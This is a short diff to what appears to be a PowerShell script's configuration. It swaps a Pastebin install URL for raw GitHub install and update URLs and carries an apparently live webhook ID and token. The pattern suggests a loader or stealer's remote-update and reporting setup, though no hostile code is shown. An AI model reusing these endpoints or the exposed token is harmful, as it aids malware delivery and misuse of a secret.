@@ -2,8 +2,8 @@
 # VARIABLES 
 # --------- #
 $install_path = $install_path;
-$install_url = "https://pastebin.com/raw/fr6uJ0bb"
-$update_url = ""
+$install_url = "https://raw.githubusercontent.com/aodfs/0/refs/heads/main/i"
+$update_url = "https://raw.githubusercontent.com/aodfs/0/refs/heads/main/u"
 $webhook_url = "1305333146228752536/iggbztKYTfK72bjEd5r0C93T2vksQIkt1x_hXpHfg9A_JXBk8gKNMyTPUsE1myRNPH4y";
 
 # ------------------------------ #
